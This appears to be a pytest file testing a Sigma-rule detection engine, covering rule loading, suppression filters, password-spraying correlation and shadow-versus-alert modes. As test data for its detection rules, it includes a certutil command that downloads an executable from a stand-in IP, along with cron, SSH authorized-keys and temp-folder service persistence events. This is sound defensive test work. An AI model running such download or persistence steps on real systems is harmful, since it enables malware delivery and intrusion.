"""
Sigma layer (audit G-28): curated rules load, match the events they are for,
honour suppressions and correlations, stay quiet on benign data, and run in
shadow mode unless an operator switches them to alert.
"""

from datetime import datetime, timedelta, timezone

import pytest

pytest.importorskip("sigma")

from lsadra.detection import sigma_engine  # noqa: E402
from lsadra.detection.attack_map import get_technique  # noqa: E402
from lsadra.detection.scorecard import CORPUS_DIR, score_sigma  # noqa: E402
from lsadra.detection.sigma_engine import RULES_DIR, SigmaEngine, to_sigma_event  # noqa: E402
from tests.test_live_rules import _run, orchestrator, store  # noqa: E402,F401

T0 = datetime(2026, 1, 15, 2, 0, 0, tzinfo=timezone.utc)


@pytest.fixture(scope="module")
def engine():
    return SigmaEngine()


def _row(event_type, minutes=0, ip=None, user="bob.demo", **attributes):
    return {
        "id": int(minutes * 100) + 1,
        "timestamp": (T0 + timedelta(minutes=minutes)).isoformat(),
        "event_type": event_type, "source_ip": ip, "effective_username": user,
        "attributes": attributes,
    }


def _titles(engine, *rows):
    return [{h.title for h in hits} for hits in engine.evaluate_frame(list(rows))]


# ── loading and metadata ────────────────────────────────────────────────────

def test_curated_rules_load_without_errors(engine):
    assert len(engine.rules) + len(engine.correlations) >= 60
    assert len([s for s in engine._source.values() if s == "sigmahq"]) >= 50
    assert engine.correlations and engine.filters


def test_every_rule_has_metadata_and_a_current_attack_technique(engine):
    for rule in engine.rules + engine.correlations:
        hit = engine.meta(rule)
        assert rule.id and rule.title and rule.level, rule.title
        if hit.level == "informational":
            continue  # correlation base rules
        # A few SigmaHQ rules carry a tactic only; they still need one.
        for tid in hit.technique_ids:
            tech = get_technique(tid)
            assert tech is not None and tech.active, (rule.title, tid)
        assert hit.tactics, rule.title


def test_sigmahq_rules_keep_their_attribution():
    """DRL 1.1: SigmaHQ rules ship unmodified, with author and references."""
    import yaml

    files = sorted((RULES_DIR / "sigmahq").glob("*.yml"))
    assert files
    for path in files:
        doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        assert doc.get("author"), path.name
        assert doc.get("id"), path.name
    readme = (RULES_DIR / "README.md").read_text(encoding="utf-8")
    assert "Detection Rule License" in readme


# ── curated positives and negatives ────────────────────────────────────────

CASES = [
    ("Suspicious Download Via Certutil.EXE", _row(
        "process_exec", process_path="C:\\Windows\\System32\\certutil.exe",
        cmdline="certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe")),
    ("Cron File Written", _row("file_write", target_path="/etc/cron.d/updater")),
    ("SSH Authorized Keys File Written", _row(
        "file_write", target_path="/home/bob.demo/.ssh/authorized_keys")),
    ("Local User Account Created", _row(
        "account_create", event_id=4720, process_path="C:\\Windows\\System32\\lsass.exe")),
    ("Service Installed From A Temp Folder", _row(
        "service_install", service_name="DemoSvc", image_path="C:\\Windows\\Temp\\demo.exe")),
    ("Service ImagePath Set To A Temp Folder", _row(
        "registry_set", registry_key="HKLM\\SYSTEM\\CurrentControlSet\\Services\\DemoSvc",
        value_name="ImagePath", new_value="C:\\Windows\\Temp\\demo.exe")),
    ("Archive Written To A Hidden Directory", _row(
        "archive_create", archive_path="/var/tmp/.stage/out.tar.gz")),
]


@pytest.mark.parametrize("title,row", CASES, ids=[c[0] for c in CASES])
def test_rule_matches_its_event(engine, title, row):
    [hits] = _titles(engine, row)
    assert title in hits, hits


@pytest.mark.parametrize("row", [
    _row("process_exec", process_path="/usr/bin/ls", cmdline="ls -la /tmp"),
    _row("file_write", target_path="/home/bob.demo/notes.txt"),
    _row("archive_create", archive_path="/home/bob.demo/backup.tar.gz"),
    _row("service_install", service_name="DemoSvc",
         image_path="C:\\Program Files\\Demo\\svc.exe"),
    _row("auth_success", ip="192.0.2.10"),
])
def test_ordinary_events_do_not_match(engine, row):
    [hits] = engine.evaluate_frame([row])
    assert [h.title for h in hits if h.raises_alert] == []


def test_bundled_suppression_filter_applies(engine):
    """filters/suppressions.yml exempts the demo backup job's cron file."""
    [hits] = _titles(engine, _row("file_write", target_path="/etc/cron.d/demo-backupd"))
    assert "Cron File Written" not in hits


def test_operator_suppressions_file_applies(tmp_path):
    extra = tmp_path / "ops.yml"
    extra.write_text(
        "title: Ignore the updater cron file\n"
        "id: 3f1d2a4e-6b7c-4d8e-9f00-112233445566\n"
        "logsource:\n  category: file_event\n  product: linux\n"
        "filter:\n  rules:\n    - lsadra_lnx_cron_file_write\n"
        "  selection:\n    TargetFilename: '/etc/cron.d/updater'\n"
        "  condition: not selection\n",
        encoding="utf-8",
    )
    eng = SigmaEngine(extra_filters=[extra])
    [hits] = _titles(eng, _row("file_write", target_path="/etc/cron.d/updater"))
    assert "Cron File Written" not in hits
    [hits] = _titles(eng, _row("file_write", target_path="/etc/cron.d/other"))
    assert "Cron File Written" in hits


# ── correlation ─────────────────────────────────────────────────────────────

def _spray(users, step_minutes=1.0, ip="203.0.113.9"):
    return [_row("auth_failure", minutes=i * step_minutes, ip=ip, user=u)
            for i, u in enumerate(users)]


def test_password_spraying_correlation_fires_on_five_users(engine):
    rows = _spray([f"user{i}.demo" for i in range(5)])
    hits = engine.evaluate_frame(rows)
    assert all(not h for h in hits[:4])
    [corr] = [h for h in hits[4] if h.correlation]
    assert corr.title == "Password Spraying From One Source" and corr.level == "high"
    assert corr.technique_ids == ("T1110.003",)


@pytest.mark.parametrize("rows", [
    _spray([f"user{i}.demo" for i in range(4)]),                  # too few users
    _spray(["bob.demo"] * 8),                                      # one user: brute force
    _spray([f"user{i}.demo" for i in range(5)], step_minutes=4),  # spread past 10 minutes
])
def test_password_spraying_needs_five_users_in_ten_minutes(engine, rows):
    assert not any(h.correlation for hits in engine.evaluate_frame(rows) for h in hits)


def test_correlation_state_does_not_leak_between_frames(engine):
    rows = _spray([f"user{i}.demo" for i in range(5)])
    engine.evaluate_frame(rows[:3])
    hits = engine.evaluate_frame(rows[3:])
    assert not any(h.correlation for hs in hits for h in hs)


# ── event mapping ──────────────────────────────────────────────────────────

def test_event_mapping_uses_sigma_taxonomy():
    ev = to_sigma_event(_row("process_exec", process_name="certutil.exe",
                             parent_process="cmd.exe", cmdline="certutil -decode a b"))
    assert ev.logsource.category == "process_creation" and ev.logsource.product == "windows"
    assert ev.data["Image"] == "\\certutil.exe" and ev.data["ParentImage"] == "\\cmd.exe"
    assert ev.data["OriginalFileName"] == "certutil.exe"
    ev = to_sigma_event(_row("auth_failure", ip="198.51.100.4", user="eve.demo"))
    assert ev.logsource.category == "authentication"
    assert ev.data == {"User": "eve.demo", "TargetUserName": "eve.demo",
                       "SourceIp": "198.51.100.4", "Outcome": "failure"}


def test_lookalike_event_types_map_to_nothing(engine):
    """Event types outside the closed list never reach a Sigma logsource."""
    row = _row("file_write\u200b", target_path="/etc/cron.d/x")
    [hits] = engine.evaluate_frame([row])
    assert hits == []


# ── corpus ─────────────────────────────────────────────────────────────────

def test_benign_corpus_raises_no_medium_sigma_match():
    card = score_sigma(CORPUS_DIR)
    assert card["summary"]["benign_events_matched"] == 0
    assert card["scenarios"]["injection_attempts"]["attack_events_matched"] == 0


# ── live path: shadow by default, alert when switched ──────────────────────

def _authorized_keys_write(store):
    store.add(0, event_type="file_write", ip=None, target_path="/root/.ssh/authorized_keys")


def test_shadow_mode_records_matches_without_alerting(store, orchestrator, monkeypatch):
    monkeypatch.setattr(sigma_engine, "sigma_mode", lambda: "shadow")
    _authorized_keys_write(store)
    _run(orchestrator, monkeypatch)
    assert store.anomalies == []
    [res] = store.sigma
    assert res["sigma_mode"] == "shadow"
    assert [h["title"] for h in res["sigma_matches"]] == ["SSH Authorized Keys File Written"]


def test_alert_mode_raises_an_alert_with_the_sigma_technique(store, orchestrator, monkeypatch):
    monkeypatch.setattr(sigma_engine, "sigma_mode", lambda: "alert")
    _authorized_keys_write(store)
    _run(orchestrator, monkeypatch)
    [alert] = store.anomalies
    assert alert["mitre_technique"] == "T1098.004"
    assert alert["threat_type"] == "SSH Authorized Keys File Written"
    assert alert["rule_id"].startswith("sigma:")
    assert alert["severity_label"] in ("MEDIUM", "HIGH", "CRITICAL")


def test_off_mode_skips_the_layer(store, orchestrator, monkeypatch):
    monkeypatch.setattr(sigma_engine, "sigma_mode", lambda: "off")
    _authorized_keys_write(store)
    _run(orchestrator, monkeypatch)
    assert store.anomalies == [] and store.sigma == []


def test_unknown_mode_falls_back_to_shadow(monkeypatch):
    import lsadra.config as config

    monkeypatch.setattr(config, "SIGMA_MODE", "loud")
    assert sigma_engine.sigma_mode() == "shadow"


def test_context_rows_feed_correlations_but_get_no_hits(engine):
    rows = _spray([f"user{i}.demo" for i in range(5)])
    rows.insert(0, _row("file_write", minutes=0, target_path="/etc/cron.d/updater"))
    scored = [False] * 5 + [True]
    hits = engine.evaluate_frame(rows, scored=scored)
    assert all(h == [] for h in hits[:5])  # the cron write is context: not reported
    assert [h.title for h in hits[5] if h.correlation] == ["Password Spraying From One Source"]
